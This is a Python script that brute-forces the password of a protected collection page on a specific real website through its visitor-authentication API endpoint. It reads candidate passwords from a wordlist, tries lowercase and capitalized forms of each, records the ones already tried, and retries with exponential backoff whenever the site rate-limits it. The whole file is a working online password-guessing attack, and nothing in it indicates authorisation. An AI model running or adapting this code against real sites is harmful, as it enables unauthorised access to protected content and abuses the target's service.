
from progressbar import progressbar
import time

def send_with_backoff(s, url, params, json, cookies):
    """
    Send a POST request, handling rate limits (429) with exponential backoff.
    """
    retries = 0
    backoff = 1  # Start with 1 second
    while True:
        response = s.post(url, params=params, json=json, cookies=cookies)
        if response.status_code != 429:
            return response
        time.sleep(backoff)
        backoff = min(backoff * 2, 30)  # Exponential backoff, max 30s
        retries += 1

def test_passwords(args, s):
    """
    Test passwords from the test file against the API.
    Returns the first successful password, or an empty string.
    """
    testfile_content = []
    # Read potential passwords
    with open(args.test, "r", encoding="utf8") as test_file:
        testfile_content = test_file.read().splitlines()

    for i in progressbar(range(len(testfile_content))):
        line_entry = testfile_content[i]
        if line_entry.strip():
            # Skip if already tested
            with open(args.tested, "r", encoding="utf8") as tested_file:
                if line_entry.lower() in tested_file.read():
                    continue

            # Try lowercase
            r1 = send_with_backoff(
                s,
                "https://www.trenchcrusade.com/api/auth/visitor/collection",
                params={"crumb": args.crumb},
                json={"password": line_entry.lower(), "collectionId": args.collection_id},
                cookies={"crumb": args.crumb}
            )

            # Try capitalized
            r2 = send_with_backoff(
                s,
                "https://www.trenchcrusade.com/api/auth/visitor/collection",
                params={"crumb": args.crumb},
                json={"password": line_entry.capitalize(), "collectionId": args.collection_id},
                cookies={"crumb": args.crumb}
            )

            # Success if status code is 2xx
            if 200 <= r1.status_code < 300:
                return line_entry.lower()
            if 200 <= r2.status_code < 300:
                return line_entry.capitalize()

            # Mark as tested
            with open(args.tested, "a", encoding="utf8") as tested_file:
                tested_file.writelines(line_entry.lower() + '\n')
    return ""